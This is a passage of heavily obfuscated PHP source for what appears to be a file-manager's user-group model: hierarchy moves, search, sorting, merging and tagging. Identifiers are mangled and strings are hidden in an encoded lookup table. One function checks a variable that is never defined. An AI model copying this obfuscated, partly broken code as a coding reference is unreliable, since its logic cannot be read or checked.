$this->getInfoSimple($ıø‰‡Ñ¥); if (!$õÖì‹‡Ñ) { return !1; } if ($—îõÇÈ == $Ãšİƒ’¢[100]) { $ÆÑÜã“ = $this->parentLevelArray($õÖì‹‡Ñ[$Ãšİƒ’¢[564]]); } else { $¥ãÉü¿á = array($Ãšİƒ’¢[631] => array($Ãšİƒ’¢[591], $õÖì‹‡Ñ[$Ãšİƒ’¢[564]] . $õÖì‹‡Ñ[$Ãšİƒ’¢[1891]] . $Ãšİƒ’¢[592])); $ÆÑÜã“ = $this->where($¥ãÉü¿á)->field($Ãšİƒ’¢[1891])->select(); $ÆÑÜã“ = array_to_keyvalue($ÆÑÜã“, $Ãšİƒ’¢[22], $Ãšİƒ’¢[1891]); } $ÆÑÜã“[] = $õÖì‹‡Ñ[$Ãšİƒ’¢[1891]]; $ùİÒñÁë = array(); foreach ($ÆÑÜã“ as $ıø‰‡Ñ¥) { $ùİÒñÁë[] = array($Ãšİƒ’¢[1891] => $ıø‰‡Ñ¥, $Ãšİƒ’¢[106] => $Ãšİƒ’¢[791], $Ãšİƒ’¢[429] => $—îõÇÈ); $this->_clearCache($ıø‰‡Ñ¥); } return Model($Ãšİƒ’¢[1980])->addAll($ùİÒñÁë, array(), !0); } protected function groupRemove($±÷œ’Ú×, $·ïì‚¼› = false) { $®¿Ìœ‚ =& $_SERVER[•€áå–Õ]; $é¢ÆôÆ = array($®¿Ìœ‚[1891] => $±÷œ’Ú×); $¯²çÛƒ‰ = $this->where($é¢ÆôÆ)->find(); if (!$¯²çÛƒ‰ || $¯²çÛƒ‰[$®¿Ìœ‚[192]] == 0) { return !1; } if (!$·ïì‚¼›) { $˜Šï¨¦à = $this->getInfoSimple($¯²çÛƒ‰[$®¿Ìœ‚[192]]); $this->_changeChildLevel($¯²çÛƒ‰, $˜Šï¨¦à, !0); $this->where(array($®¿Ìœ‚[192] => $±÷œ’Ú×))->save(array($®¿Ìœ‚[192] => $¯²çÛƒ‰[$®¿Ìœ‚[192]])); $this->_clearCache($˜Šï¨¦à[$®¿Ìœ‚[1891]]); } Model($®¿Ìœ‚[1980])->where($é¢ÆôÆ)->delete(); Model($®¿Ìœ‚[1981])->where($é¢ÆôÆ)->delete(); Model($®¿Ìœ‚[866])->groupRootRemove($±÷œ’Ú×); $this->_clearCache($¯²çÛƒ‰[$®¿Ìœ‚[192]]); return $this->where($é¢ÆôÆ)->delete(); } protected function groupSort($ñ¼µ¨²‘) { $œŠâñ =& $_SERVER[•€áå–Õ]; $Ì›ªú§ª = array(); foreach ($ñ¼µ¨²‘ as $Ñ‡—ôáÑ => $Ğ·ğüõ) { $Ì›ªú§ª[] = array($œŠâñ[1891], $Ğ·ğüõ, $œŠâñ[1915], $Ñ‡—ôáÑ + 1); } $this->saveAll($Ì›ªú§ª); } public function listData() { $­™ØÜí = $this->_makeOrder()->selectPage(50); $this->_listDataApply($­™ØÜí[$_SERVER[•€áå–Õ][424]]); return $­™ØÜí; } private function _makeOrder($ï‰¯¡¶„ = '') { $–úú¨å =& $_SERVER[•€áå–Õ]; $„¦´İ» = array($–úú¨å[1891], $–úú¨å[42], $–úú¨å[1880], $–úú¨å[227]); $Õ¿ü¦¶ç = array($–úú¨å[502] => $–úú¨å[503], $–úú¨å[504] => $–úú¨å[505]); $ÙãÛ«˜è = Input::get($–úú¨å[509], $–úú¨å[17], $–úú¨å[1895], $„¦´İ»); $Šœı” = Input::get($–úú¨å[510], $–úú¨å[17], $–úú¨å[1982], array($–úú¨å[1982], $–úú¨å[504])); $Šœı” = $Õ¿ü¦¶ç[$Šœı”]; $ï‰¯¡¶„ = $ï‰¯¡¶„ . "{$ÙãÛ«˜è}\40{$Šœı”}\x2c\x20\147\x72\157\165\x70\x49\104\40\141\x73\x63"; return $this->order($ï‰¯¡¶„); } public function listChild($Í¾ì””È) { $ï¤ƒœ™˜ =& $_SERVER[•€áå–Õ]; $¸µ‰ù¼¥ = $this->where(array($ï¤ƒœ™˜[192] => $Í¾ì””È))->_makeOrder()->selectPage(200); $this->_listDataApply($¸µ‰ù¼¥[$ï¤ƒœ™˜[424]]); return $¸µ‰ù¼¥; } public function listChildIds($Í‚Éîƒ) { $ÀºË¤Œ =& $_SERVER[•€áå–Õ]; if (is_string($·ô¶¤âˆ)) { $Í‚Éîƒ = explode($ÀºË¤Œ[60], $Í‚Éîƒ); } $©—ı¬«÷ = $this->where(array($ÀºË¤Œ[1891] => array($ÀºË¤Œ[17], $Í‚Éîƒ)))->field($ÀºË¤Œ[1983])->select(); if (!$©—ı¬«÷) { return !1; } $ÍßÔšµ¢ = array(); foreach ($©—ı¬«÷ as $ÊÙôˆşÅ) { $ÍßÔšµ¢[] = "\163\145\154\145\143\x74\40\147\162\157\165\160\x49\x44\40\146\x72\157\x6d\x20\140\x67\x72\157\165\x70\140\x20\167\x68\x65\162\145\40\x70\x61\162\x65\156\x74\x4c\145\x76\145\154\x20\x6c\151\x6b\x65\x20\x27{$ÊÙôˆşÅ[$ÀºË¤Œ[564]]}{$ÊÙôˆşÅ[$ÀºË¤Œ[1891]]}\54\45\x27"; } $ÍßÔšµ¢ = implode($ÀºË¤Œ[1984], $ÍßÔšµ¢); $©—ı¬«÷ = $this->query($ÍßÔšµ¢); if (!$©—ı¬«÷) { return array(); } $Í‚Éîƒ = array_to_keyvalue($©—ı¬«÷, $ÀºË¤Œ[22], $ÀºË¤Œ[1891]); return array_unique($Í‚Éîƒ); } public function listByID($Âãìá±) { $í´ûé¼¦ =& $_SERVER[•€áå–Õ]; if (!$Âãìá±) { return array(); } $¼ïÖ•‹ = array($í´ûé¼¦[1891] => array($í´ûé¼¦[17], $Âãìá±)); $ù¯ïÔôõ = $this->where($¼ïÖ•‹)->select(); $ù¯ïÔôõ = array_sort_keep($ù¯ïÔôõ, $í´ûé¼¦[1891], $Âãìá±); $this->_listDataApply($ù¯ïÔôõ); return $ù¯ïÔôõ; } public function listSearch($Â†”İ±ü) { $…õ†È·± =& $_SERVER[•€áå–Õ]; $„Ôæ·ï = $Â†”İ±ü[$…õ†È·±[1985]]; $ÍòÈ°şŠ = isset($Â†”İ±ü[$…õ†È·±[1986]]) ? $Â†”İ±ü[$…õ†È·±[1986]] : !1; if (!trim($„Ôæ·ï)) { return !1; } $„Ôæ·ï = str_replace($…õ†È·±[1987], $…õ†È·±[1988], $„Ôæ·ï); $Óš†¹ Ü = array($…õ†È·±[1891] => array($…õ†È·±[438], "{$„Ôæ·ï}\x25"), $…õ†È·±[42] => array($…õ†È·±[438], "\45{$„Ôæ·ï}\x25"), $…õ†È·±[1041] => $…õ†È·±[1989]); if ($ÍòÈ°şŠ) { $Ÿ‚ŒÏç˜ = $this->getInfoSimple($ÍòÈ°şŠ); $ÄÀ¨‡“Ä = $Ÿ‚ŒÏç˜[$…õ†È·±[564]] . $ÍòÈ°şŠ . $…õ†È·±[592]; $Óš†¹ Ü = array($Óš†¹ Ü, array($…õ†È·±[564] => array($…õ†È·±[438], $ÄÀ¨‡“Ä))); } $Óš†¹ Ü = $this->parseWhereLike($Óš†¹ Ü); $Ù¹•öÎÙ = $this->_makeOrder()->where($Óš†¹ Ü)->selectPage(20); $Ù¹•öÎÙ = $Ù¹•öÎÙ ? $Ù¹•öÎÙ : array($…õ†È·±[424] => array(), $…õ†È·±[421] => array()); if (!$Ù¹•öÎÙ || count($Ù¹•öÎÙ[$…õ†È·±[424]]) < 5 && Input::check($„Ôæ·ï, $…õ†È·±[373])) { $úíßä¸º = $this->groupChildrenAll($ÍòÈ°şŠ); $€ºşêÎ = $this->_searchFromMeta($…õ†È·±[516], $„Ôæ·ï, 10, $úíßä¸º); $² °Ü–Œ = $this->_searchFromMeta($…õ†È·±[517], $„Ôæ·ï, 10, $úíßä¸º); $Ì®Ìö  = array_merge($€ºşêÎ, $² °Ü–Œ, $Ù¹•öÎÙ[$…õ†È·±[424]]); $Ù¹•öÎÙ[$…õ†È·±[424]] = array_unique_by_key($Ì®Ìö , $…õ†È·±[1891]); $Ù¹•öÎÙ[$…õ†È·±[421]][$…õ†È·±[422]] = count($Ù¹•öÎÙ[$…õ†È·±[424]]); $Ù¹•öÎÙ[$…õ†È·±[421]][$…õ†È·±[423]] = ceil($Ù¹•öÎÙ[$…õ†È·±[421]][$…õ†È·±[422]] / $Ù¹•öÎÙ[$…õ†È·±[421]][$…õ†È·±[418]]); } $this->_listDataApply($Ù¹•öÎÙ[$…õ†È·±[424]]); return $Ù¹•öÎÙ; } protected function groupChildrenAll($äø—×å) { $ÜºÖ—¸¾ =& $_SERVER[•€áå–Õ]; if (!$äø—×å) { return !1; } if (!is_array($äø—×å)) { $äø—×å = array($äø—×å); } $®Ôêõ§¹ = $äø—×å; foreach ($äø—×å as $ÙèœÕˆ¹) { $„¦…¯¼¹ = $this->getInfoSimple($ÙèœÕˆ¹); $õßªÉÙÄ = array($ÜºÖ—¸¾[564] => array($ÜºÖ—¸¾[438], $„¦…¯¼¹[$ÜºÖ—¸¾[564]] . $ÙèœÕˆ¹ . $ÜºÖ—¸¾[592])); $ïÌÛÕ© = $this->field($ÜºÖ—¸¾[1891])->where($õßªÉÙÄ)->select(); $®Ôêõ§¹ = array_merge($®Ôêõ§¹, array_to_keyvalue($ïÌÛÕ©, $ÜºÖ—¸¾[22], $ÜºÖ—¸¾[1891])); } return array_unique($®Ôêõ§¹); } private function _searchFromMeta($Á£é ¿Ï, $çÆïï¤Ô, $É¼•éæß, $ÔÀ¥¯¾™) { $ÕÌšõ‚Æ =& $_SERVER[•€áå–Õ]; $çÆïï¤Ô = strtolower($çÆïï¤Ô); $ØŸşœê‰ = array($ÕÌšõ‚Æ[106] => $Á£é ¿Ï, $ÕÌšõ‚Æ[429] => array($ÕÌšõ‚Æ[438], "\x25{$çÆïï¤Ô}\x25")); $ØŸşœê‰ = $this->parseWhereLike($ØŸşœê‰); if ($ÔÀ¥¯¾™) { $ØŸşœê‰[$ÕÌšõ‚Æ[1891]] = array($ÕÌšõ‚Æ[17], $ÔÀ¥¯¾™); } $ùˆÉ˜§È = Model($ÕÌšõ‚Æ[1990])->where($ØŸşœê‰)->limit($É¼•éæß)->select(); if (!$ùˆÉ˜§È) { return array(); } $ùˆÉ˜§È = array_to_keyvalue($ùˆÉ˜§È, $ÕÌšõ‚Æ[22], $ÕÌšõ‚Æ[1891]); $ê·¢İŸ = $this->where(array($ÕÌšõ‚Æ[1979] => array($ÕÌšõ‚Æ[17], $ùˆÉ˜§È)))->select(); if (!$ê·¢İŸ) { return array(); } return $ê·¢İŸ; } protected function _listDataApplyItem($ÄÈ¾üÈİ) { $ü´ìü¤À = array($ÄÈ¾üÈİ); $this->_listDataApply($ü´ìü¤À); return $ü´ìü¤À[0]; } protected function _listDataApply(&$¦åöØ¾Õ) { $ñ˜ÏÕî =& $_SERVER[•€áå–Õ]; if (!$¦åöØ¾Õ) { return; } $Ü›§£®Î = array_to_keyvalue($¦åöØ¾Õ, $ñ˜ÏÕî[22], $ñ˜ÏÕî[1891]); $this->_listAppendChildren($¦åöØ¾Õ); $this->_listAppendChildrenMember($¦åöØ¾Õ); $this->_listAppendMeta($¦åöØ¾Õ, $Ü›§£®Î); $this->_listAppendParent($¦åöØ¾Õ); $this->_listAppendSourceRoot($¦åöØ¾Õ, $Ü›§£®Î); } private function _listAppendChildren(&$Õˆ¤àØ) { $ˆ¯¤ÚÓö =& $_SERVER[•€áå–Õ]; $ßÀèåÙ = array_to_keyvalue($Õˆ¤àØ, $ˆ¯¤ÚÓö[22], $ˆ¯¤ÚÓö[1891]); $Î—ŞÏ = array($ˆ¯¤ÚÓö[192] => array($ˆ¯¤ÚÓö[17], $ßÀèåÙ)); $•Ÿµ°£­ = array($ˆ¯¤ÚÓö[192], $ˆ¯¤ÚÓö[1991] => $ˆ¯¤ÚÓö[545]); $ü¾¯Îú = $this->field($•Ÿµ°£­)->where($Î—ŞÏ)->group($ˆ¯¤ÚÓö[192])->select(); $ø¼®õ™â = array_to_keyvalue($ü¾¯Îú, $ˆ¯¤ÚÓö[192], $ˆ¯¤ÚÓö[545]); foreach ($Õˆ¤àØ as &$‚ğ·¨ÙÕ) { $ñõÉäæ¬ = $‚ğ·¨ÙÕ[$ˆ¯¤ÚÓö[1891]]; $‚ğ·¨ÙÕ[$ˆ¯¤ÚÓö[1992]] = isset($ø¼®õ™â[$ñõÉäæ¬]) ? intval($ø¼®õ™â[$ñõÉäæ¬]) : !1; } unset($‚ğ·¨ÙÕ); } private function _listAppendChildrenMember(&$Áí»óšÌ) { $Ù¥‚ğÒë =& $_SERVER[•€áå–Õ]; $“«ÑÀŠ = array_to_keyvalue($Áí»óšÌ, $Ù¥‚ğÒë[22], $Ù¥‚ğÒë[1891]); $Èâ‹‰Ûõ = array($Ù¥‚ğÒë[1891] => array($Ù¥‚ğÒë[17], $“«ÑÀŠ)); $’¢‹ú—Ä = array($Ù¥‚ğÒë[1891], $Ù¥‚ğÒë[1991] => $Ù¥‚ğÒë[545]); $òÂš÷òõ = Model($Ù¥‚ğÒë[1981])->field($’¢‹ú—Ä)->where($Èâ‹‰Ûõ)->group($Ù¥‚ğÒë[1891])->select(); $Ä§¢«Ãô = array_to_keyvalue($òÂš÷òõ, $Ù¥‚ğÒë[1891], $Ù¥‚ğÒë[545]); foreach ($Áí»óšÌ as &$¡Æ¨ÖÀ“) { $÷‚‹ïÒ = $¡Æ¨ÖÀ“[$Ù¥‚ğÒë[1891]]; $¡Æ¨ÖÀ“[$Ù¥‚ğÒë[1993]] = isset($Ä§¢«Ãô[$÷‚‹ïÒ]) ? intval($Ä§¢«Ãô[$÷‚‹ïÒ]) : !1; } unset($¡Æ¨ÖÀ“); } private function _listAppendMeta(&$æÃà˜“§, $´±·‚‹¯) { $¥˜©£Ê =& $_SERVER[•€áå–Õ]; $°¾›óø = array($¥˜©£Ê[1891] => array($¥˜©£Ê[17], $´±·‚‹¯)); $²ƒÂéü = Model($¥˜©£Ê[1980])->where($°¾›óø)->select(); $²ƒÂéü = array_to_keyvalue_group($²ƒÂéü, $¥˜©£Ê[1891]); foreach ($²ƒÂéü as &$éƒüİ¼±) { $éƒüİ¼± = array_to_keyvalue($éƒüİ¼±, $¥˜©£Ê[106], $¥˜©£Ê[429]); } unset($éƒüİ¼±); foreach ($æÃà˜“§ as &$ñåÜ€ “) { $ñåÜ€ “[$¥˜©£Ê[518]] = array(); if (isset($²ƒÂéü[$ñåÜ€ “[$¥˜©£Ê[1891]]])) { $ñåÜ€ “[$¥˜©£Ê[518]] = $²ƒÂéü[$ñåÜ€ “[$¥˜©£Ê[1891]]]; } } unset($ñåÜ€ “); } protected function parentLevelArray($·’Ô†ÒÔ) { $˜«÷¹Æ´ =& $_SERVER[•€áå–Õ]; $·’Ô†ÒÔ = explode($˜«÷¹Æ´[60], trim($·’Ô†ÒÔ, $˜«÷¹Æ´[60])); $·’Ô†ÒÔ = array_remove_value($·’Ô†ÒÔ, $˜«÷¹Æ´[224]); return $·’Ô†ÒÔ; } protected function parentInGroup($Ê¿×‹„, $Ì¬èú¹‘) { $Åæ·Œáï =& $_SERVER[•€áå–Õ]; $Ò½îà˜Û = $this->getInfoSimple($Ê¿×‹„); if (!$Ò½îà˜Û) { return !0; } $œ€‚­ÑË = $this->parentLevelArray($Ò½îà˜Û[$Åæ·Œáï[564]]); $œ€‚­ÑË[] = $Ê¿×‹„; foreach ($œ€‚­ÑË as $Ê¿×‹„) { if (in_array($Ê¿×‹„ . $Åæ·Œáï[22], $Ì¬èú¹‘)) { return !0; } } return !1; } private function _listAppendParent(&$Äç‹á´®) { $îÕŒß«à =& $_SERVER[•€áå–Õ]; $”òè„®ò = array(); foreach ($Äç‹á´® as &$”Ë¥…¬Ä) { $”òè„®ò[$”Ë¥…¬Ä[$îÕŒß«à[1891]]] = $”Ë¥…¬Ä[$îÕŒß«à[42]]; $‚Í£©—ò = $this->parentLevelArray($”Ë¥…¬Ä[$îÕŒß«à[564]]); foreach ($‚Í£©—ò as $È»“¢â) { if (!isset($”òè„®ò[$È»“¢â])) { $”òè„®ò[$È»“¢â] = 0; } } } unset($”Ë¥…¬Ä); foreach ($”òè„®ò as $”È‰€” => $È®î˜È) { if ($È®î˜È) { continue; } $«ÊõåÊ¥ = $this->getInfoSimple($”È‰€”); $”òè„®ò[$”È‰€”] = $«ÊõåÊ¥[$îÕŒß«à[42]]; } $ƒ”¦Í‹‹ = $GLOBALS[$îÕŒß«à[16]][$îÕŒß«à[101]][$îÕŒß«à[1994]]; if (KodUser::isRoot()) { $ƒ”¦Í‹‹ = !1; } foreach ($Äç‹á´® as &$”Ë¥…¬Ä) { $‚Í£©—ò = $this->parentLevelArray($”Ë¥…¬Ä[$îÕŒß«à[564]]); $ˆâ›®€ş = $îÕŒß«à[22]; foreach ($‚Í£©—ò as $”È‰€” => $È»“¢â) { if ($ƒ”¦Í‹‹ && $”È‰€” == 0) { continue; } $ˆâ›®€ş .= $”òè„®ò[$È»“¢â] . $îÕŒß«à[18]; } if ($‚Í£©—ò) { $ˆâ›®€ş .= $”Ë¥…¬Ä[$îÕŒß«à[42]]; } $”Ë¥…¬Ä[$îÕŒß«à[569]] = str_replace($îÕŒß«à[572], $îÕŒß«à[18], $ˆâ›®€ş); } unset($”Ë¥…¬Ä); } private function _listAppendSourceRoot(&$¶”ı³˜, $‘İ¦ıæ) { $æŠïØŒÔ =& $_SERVER[•€áå–Õ]; $¬¯•Š¦ƒ = Model($æŠïØŒÔ[866])->listSourceRoot(SourceModel::TYPE_GROUP, $‘İ¦ıæ); $¬¯•Š¦ƒ = array_to_keyvalue($¬¯•Š¦ƒ, $æŠïØŒÔ[549]); $¬¯•Š¦ƒ = array_remove_key($¬¯•Š¦ƒ, $æŠïØŒÔ[549]); foreach ($¶”ı³˜ as &$ İ†‚ß) { $ İ†‚ß[$æŠïØŒÔ[99]] = $¬¯•Š¦ƒ[$ İ†‚ß[$æŠïØŒÔ[1891]]] ? $¬¯•Š¦ƒ[$ İ†‚ß[$æŠïØŒÔ[1891]]] : array(); } unset($ İ†‚ß); } protected function groupMerge($İ—‡¡ÃÒ) { $İ—‡¡ÃÒ = array_values(array_unique($İ—‡¡ÃÒ)); $úó˜üë = array(); for ($ûªŞõ”Ö = 0; $ûªŞõ”Ö < count($İ—‡¡ÃÒ); $ûªŞõ”Ö++) { $¿’™³“ñ = !1; for ($¡áÅ±™ = 0; $¡áÅ±™ < count($İ—‡¡ÃÒ); $¡áÅ±™++) { if ($ûªŞõ”Ö == $¡áÅ±™) { continue; } if ($this->isParentOf($İ—‡¡ÃÒ[$¡áÅ±™], $İ—‡¡ÃÒ[$ûªŞõ”Ö])) { $¿’™³“ñ = !0; break; } } if (!$¿’™³“ñ) { $úó˜üë[] = $İ—‡¡ÃÒ[$ûªŞõ”Ö]; } } return $úó˜üë; } protected function isParentOf($ü’Øô«¯, $ıÆà¿‰) { $µ˜¹·¤ =& $_SERVER[•€áå–Õ]; if (!$ü’Øô«¯ || !$ıÆà¿‰ || $ü’Øô«¯ == $ıÆà¿‰) { return !1; } $àä·»› = $this->getInfoSimple($ü’Øô«¯); $Ò¿éüñä = $this->getInfoSimple($ıÆà¿‰); $ŠÕ¼êÃ‡ = $àä·»›[$µ˜¹·¤[564]] . $ü’Øô«¯ . $µ˜¹·¤[60]; if (substr($Ò¿éüñä[$µ˜¹·¤[564]], 0, strlen($ŠÕ¼êÃ‡)) == $ŠÕ¼êÃ‡) { return !0; } return !1; } public function groupShowRoot($Î®ñ°Á¢, $éˆ„¼‘ = false) { $Œåş°ˆÔ =& $_SERVER[•€áå–Õ]; $Ş¦Êá¸ = $this->getInfo($Î®ñ°Á¢); if (!$Ş¦Êá¸) { return array(); } $Ü¡™Ê–© = $this->parentLevelArray($Ş¦Êá¸[$Œåş°ˆÔ[564]]); $ıÅí§óè = array($Î®ñ°Á¢); if (count($Ü¡™Ê–©) == 0) { return $ıÅí§óè; } if ($éˆ„¼‘ && count($Ü¡™Ê–©) == 1) { return $ıÅí§óè; } if (!$Ş¦Êá¸[$Œåş°ˆÔ[518]] || !isset($Ş¦Êá¸[$Œåş°ˆÔ[518]][$Œåş°ˆÔ[1977]]) || $Ş¦Êá¸[$Œåş°ˆÔ[518]][$Œåş°ˆÔ[1977]] == $Œåş°ˆÔ[1946]) { return $this->groupShowRoot($Ü¡™Ê–©[count($Ü¡™Ê–©) - 1], $éˆ„¼‘); } if ($Ş¦Êá¸[$Œåş°ˆÔ[518]][$Œåş°ˆÔ[1977]] == $Œåş°ˆÔ[412]) { $¢™ÂÛ“… = explode($Œåş°ˆÔ[60], $Ş¦Êá¸[$Œåş°ˆÔ[518]][$Œåş°ˆÔ[1978]]); if ($¢™ÂÛ“…) { $ıÅí§óè = array_merge($ıÅí§óè, $¢™ÂÛ“…); } } return $ıÅí§óè; } protected function resetParentLevel() { $§¥£óÚ =& $_SERVER[•€áå–Õ]; $‘‡ßı– = $§¥£óÚ[1891]; $ıÁØı…Ä = $this->select(); $ıÁØı…Ä = array_to_keyvalue($ıÁØı…Ä, $‘‡ßı–); foreach ($ıÁØı…Ä as $”‡“Æè‹) { $ĞØÆÑ = $”‡“Æè‹; $„¦Ê øš = array(); while ($ĞØÆÑ[$§¥£óÚ[192]] != 0) { $„¦Ê øš[] = $ĞØÆÑ[$§¥£óÚ[192]]; $ĞØÆÑ = $ıÁØı…Ä[$ĞØÆÑ[$§¥£óÚ[192]]]; } $„¦Ê øš[] = 0; $„¦Ê øš = $§¥£óÚ[60] . implode($§¥£óÚ[60], array_reverse($„¦Ê øš)) . $§¥£óÚ[60]; $this->setNamePinyin($”‡“Æè‹[$‘‡ßı–], $”‡“Æè‹[$§¥£óÚ[42]]); $this->where(array($‘‡ßı– => $”‡“Æè‹[$‘‡ßı–]))->save(array($§¥£óÚ[631] => $„¦Ê øš)); } return $ıÁØı…Ä; } public function groupNameAuto($ûá…î‚Ö, $åÛÍ«´›) { $±ÛŞú˜ =& $_SERVER[•€áå–Õ]; $µè€Îƒ¨ = $this->where(array($±ÛŞú˜[456] => $ûá…î‚Ö))->getField($±ÛŞú˜[42], !0); if (!$µè€Îƒ¨ || !in_array($åÛÍ«´›, $µè€Îƒ¨)) { return $åÛÍ«´›; } for ($·˜êÔ€” = 1; $·˜êÔ€” <= count($µè€Îƒ¨) + 1; $·˜êÔ€”++) { $Áö„­Æş = $åÛÍ«´› . "\x28{$·˜êÔ€”}\51"; if (!in_array($Áö„­Æş, $µè€Îƒ¨)) { return $Áö„­Æş; } } } public function groupSwitch($øÆ ÎŞ, $Şé´ûÛö) { $•²—¶ÂË =& $_SERVER[•€áå–Õ]; $«ÊÏñÅ = array($•²—¶ÂË[1891] => array($•²—¶ÂË[17], array($øÆ ÎŞ, $Şé´ûÛö))); $éàòôù’ = $this->where($«ÊÏñÅ)->select(); $éàòôù’ = array_to_keyvalue($éàòôù’, $•²—¶ÂË[1891]); if (!isset($éàòôù’[$øÆ ÎŞ]) || !isset($éàòôù’[$Şé´ûÛö]) || $éàòôù’[$øÆ ÎŞ][$•²—¶ÂË[192]] == 0) { return !1; } $«ÊÏñÅ = array($•²—¶ÂË[1891] => $øÆ ÎŞ); $§æ‘€¾š = Model($•²—¶ÂË[1981])->where($«ÊÏñÅ)->select(); if (!$§æ‘€¾š) { $§æ‘€¾š = array(); } foreach ($§æ‘€¾š as $§„Á«šĞ) { $Šš ø¿¬ = $§„Á«šĞ[$•²—¶ÂË[1693]]; $«ÊÏñÅ = array($•²—¶ÂË[1693] => $Šš ø¿¬, $•²—¶ÂË[1891] => $Şé´ûÛö); $©’ì¹¬Æ = Model($•²—¶ÂË[1981])->where($«ÊÏñÅ)->find(); if (!$©’ì¹¬Æ) { $•ã˜Ò¾ = array($Şé´ûÛö => $§„Á«šĞ[$•²—¶ÂË[1995]]); Model($•²—¶ÂË[578])->userGroupAdd($Šš ø¿¬, $•ã˜Ò¾); } Model($•²—¶ÂË[578])->userGroupRemove($Šš ø¿¬, $øÆ ÎŞ); } $«ÊÏñÅ = array($•²—¶ÂË[190] => 2, $•²—¶ÂË[192] => 0, $•²—¶ÂË[464] => 1, $•²—¶ÂË[549] => array($•²—¶ÂË[17], array($øÆ ÎŞ, $Şé´ûÛö))); $­¡ö¹²· = Model($•²—¶ÂË[866])->where($«ÊÏñÅ)->field($•²—¶ÂË[1996])->select(); $­¡ö¹²· = array_to_keyvalue($­¡ö¹²·, $•²—¶ÂË[549], $•²—¶ÂË[193]); $§¿ê®Éü = !empty($­¡ö¹²·[$øÆ ÎŞ]) ? $­¡ö¹²·[$øÆ ÎŞ] : !1; if ($§¿ê®Éü) { if (!$­¡ö¹²·[$Şé´ûÛö]) { $­¡ö¹²·[$Şé´ûÛö] = Model($•²—¶ÂË[866])->groupRootAdd($Şé´ûÛö); } $¥éÔè¾ = $­¡ö¹²·[$Şé´ûÛö]; $«ÊÏñÅ = array($•²—¶ÂË[192] => $§¿ê®Éü); $­¡ö¹²· = Model($•²—¶ÂË[866])->where($«ÊÏñÅ)->field($•²—¶ÂË[1997])->select(); if (!$­¡ö¹²·) { $­¡ö¹²· = array(); } Model($•²—¶ÂË[866])->moveClearAuth = !1; foreach ($­¡ö¹²· as $Ú¤ç¥±) { $šòÁ’§ = $Ú¤ç¥±[$•²—¶ÂË[464]] == $•²—¶ÂË[100] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($•²—¶ÂË[866])->move($Ú¤ç¥±[$•²—¶ÂË[193]], $¥éÔè¾, $šòÁ’§); } Model($•²—¶ÂË[866])->moveClearAuth = !0; $«ÊÏñÅ = array($•²—¶ÂË[190] => 2, $•²—¶ÂË[549] => $øÆ ÎŞ); $º³¼¾º = array($•²—¶ÂË[549] => $Şé´ûÛö); Model($•²—¶ÂË[1998])->where($«ÊÏñÅ)->save($º³¼¾º); Model($•²—¶ÂË[1999])->where($«ÊÏñÅ)->save($º³¼¾º); } $this->_changeChildLevel($éàòôù’[$øÆ ÎŞ], $éàòôù’[$Şé´ûÛö], !0); $this->where(array($•²—¶ÂË[192] => $øÆ ÎŞ))->save(array($•²—¶ÂË[192] => $Şé´ûÛö)); $this->_clearChildrenCache($éàòôù’[$Şé´ûÛö]); return !0; } } goto BŒ×¨ÅÅ; BŒ×¨ÅÅ: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($ÕÎîöÄ‡) { $¯Õ¦Õ© =& $_SERVER[•€áå–Õ]; return array($¯Õ¦Õ©[2000] => array($ÕÎîöÄ‡[0], $¯Õ¦Õ©[2001]), $¯Õ¦Õ©[2002] => array($ÕÎîöÄ‡[0], $¯Õ¦Õ©[2003])); } protected function get($Ù»ùë¥•) { $³€ĞÄ› =& $_SERVER[•€áå–Õ]; $¸òß›ºÕ = Model($³€ĞÄ›[565])->metaGet($Ù»ùë¥•, $³€ĞÄ›[2004]); $Öá“ñâ = json_decode($¸òß›ºÕ, !0); return $Öá“ñâ ? $Öá“ñâ : array($³€ĞÄ›[2005] => $³€ĞÄ›[100], $³€ĞÄ›[424] => array()); } protected function set($üø®Ü¿ø, $Ìµ®€¤ë) { $— ÆÂ²ö =& $_SERVER[•€áå–Õ]; $Ìµ®€¤ë = $Ìµ®€¤ë ? $Ìµ®€¤ë : array($— ÆÂ²ö[2005] => $— ÆÂ²ö[100], $— ÆÂ²ö[424] => array()); return Model($— ÆÂ²ö[565])->metaSet($üø®Ü¿ø, $— ÆÂ²ö[2004], json_encode($Ìµ®€¤ë)); } protected function getByTagID($÷‹îŠ†Ô, $ÅÁÎÁî˜) { $ùÉßÉÆŞ =& $_SERVER[•€áå–Õ]; if (!$÷‹îŠ†Ô || !$ÅÁÎÁî˜) { return !1; } if (!Model($ùÉßÉÆŞ[565])->getInfoSimple($÷‹îŠ†Ô)) { return !1; } $Ã€¬Û¬Ñ = $this->get($÷‹îŠ†Ô); if (!$Ã€¬Û¬Ñ || !isset($Ã€¬Û¬Ñ[$ùÉßÉÆŞ[424]])) { return !1; } $‘©õÄø× = array_find_by_field($Ã€¬Û¬Ñ[$ùÉßÉÆŞ[424]], $ùÉßÉÆŞ[454], $ÅÁÎÁî˜); return is_array($‘©õÄø×) ? $‘©õÄø× : !1; } public function listSource($ÛÜÊú—Ô, $Ñ¯Ïíí²) { $ƒŞõÈ¯ù =& $_SERVER[•€áå–Õ]; if ($Ñ¯Ïíí² && !is_array($Ñ¯Ïíí²)) { $Ñ¯Ïíí² = array($Ñ¯Ïíí²); } $´Ü²ôĞ— = $this->listData($ÛÜÊú—Ô); $€şêÂ = array(); foreach ($´Ü²ôĞ— as $Ó©‹Î”µ) { $¥ö¸Î×ú = $Ó©‹Î”µ[$ƒŞõÈ¯ù[96]]; if (!$¥ö¸Î×ú) { continue; } if (!isset($€şêÂ[$¥ö¸Î×ú])) { $€şêÂ[$¥ö¸Î×ú] = array(); } $€şêÂ[$¥ö¸Î×ú][] = $Ó©‹Î”µ[$ƒŞõÈ¯ù[479]]; } $º½Ô–Úà = array(); foreach ($€şêÂ as $ôõ½¿«Ñ => $“©·¡Ôá) { $ÒÎıÜıÖ = !0; if (!$Ñ¯Ïíí²) { $º½Ô–Úà[] = $ôõ½¿«Ñ; continue; } foreach ($Ñ¯Ïíí² as $×ºàİÍâ) { if (!in_array($×ºàİÍâ, $“©·¡Ôá)) { $ÒÎıÜıÖ = !1; break; } } if ($ÒÎıÜıÖ) { $º½Ô–Úà[] = $ôõ½¿«Ñ; } } if (!$º½Ô–Úà) { return array(); } $ñÇÉ¹²ª = array($ƒŞõÈ¯ù[470] => array($ƒŞõÈ¯ù[471], $º½Ô–Úà), $ƒŞõÈ¯ù[549] => $ÛÜÊú—Ô, $ƒŞõÈ¯ù[190] => 